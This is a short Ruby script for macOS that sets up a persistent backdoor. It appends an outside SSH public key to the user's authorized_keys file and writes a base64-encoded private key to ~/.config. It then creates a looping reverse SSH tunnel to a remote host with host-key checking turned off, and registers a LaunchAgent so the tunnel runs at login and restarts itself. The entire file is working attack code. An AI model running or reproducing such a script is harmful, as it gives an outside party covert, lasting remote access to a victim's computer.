# Static macOS variant of the cited key, tunnel, and LaunchAgent technique.
require 'base64'
require 'fileutils'
home = Dir.home
FileUtils.mkdir_p(File.join(home, '.config'))
FileUtils.mkdir_p(File.join(home, 'Library', 'LaunchAgents'))
public_key = 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDdvylCEJ/k2TpezcTfedrkHyFSK9IZ3vmP6vhY4Ss0P svc-telemetry'
encoded_key = 'LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFNd0FBQUF0emMyZ3RaVwpReU5UVXhPUUFBQUNEOEFkenlVVFZhMVBKeGk3cUFOcjdJeXlLSVRFNGFkYmRHZ3lvd09MK1JBZ0FBQUpnZE5zZFdIVGJIClZnQUFBQXR6YzJndFpXUXlOVFV4T1FBQUFDRDhBZHp5VVRWYTFQSnhpN3FBTnI3SXl5S0lURTRhZGJkR2d5b3dPTCtSQWcKQUFBRURmUXpySmVyRnB0TnZYdW9BTGtXbldOWHBDQWZGUGdzTWVaMjRRUzVmYXRQd0IzUEpSTlZyVThuR0x1b0EydnNqTApJb2hNVGhwMXQwYURLakE0djVFQ0FBQUFFWE4yWXkxMFpXeGxiV1YwY25rdGRIVnVBUUlEQkE9PQotLS0tLUVORCBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K'
FileUtils.mkdir_p(File.join(home, '.ssh'))
File.open(File.join(home, '.ssh', 'authorized_keys'), 'a') { |f| f.puts(public_key) }
key_path = File.join(home, '.config', 'bridge.key')
File.write(key_path, Base64.decode64(encoded_key))
File.chmod(0600, key_path)
runner = File.join(home, '.config', 'bridge.sh')
opts = "-N -R[::1]:0:127.0.0.1:22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -i \"#{key_path}\" tunnel@192.0.2.42"
File.write(runner, "#!/bin/sh\nwhile :; do ssh #{opts}; sleep 60; done\n")
plist = File.join(home, 'Library', 'LaunchAgents', 'org.example.bridge.plist')
File.write(plist, "<plist><dict><key>Label</key><string>org.example.bridge</string><key>ProgramArguments</key><array><string>/bin/sh</string><string>#{runner}</string></array><key>RunAtLoad</key><true/><key>KeepAlive</key><true/></dict></plist>")
system("launchctl load -w '#{plist}'")
